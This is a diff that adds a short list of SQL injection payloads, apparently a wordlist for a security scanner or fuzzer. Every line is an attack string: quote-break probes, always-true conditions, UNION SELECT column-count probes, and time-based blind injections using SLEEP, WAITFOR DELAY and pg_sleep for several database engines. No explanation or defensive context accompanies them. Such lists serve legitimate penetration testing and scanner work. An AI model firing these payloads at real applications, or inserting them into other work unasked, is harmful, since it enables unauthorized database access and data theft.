@@ -1,0 +1,21 @@
+'
+"
+'--
+'#
+' OR '1'='1
+' OR 1=1--
+' AND '1'='2
+' AND '1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4,5--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+' AND SLEEP(10)--
+' OR SLEEP(10)--
+' WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:10'--
+' AND pg_sleep(5)--
+' AND pg_sleep(10)--
+' OR 1=1/*
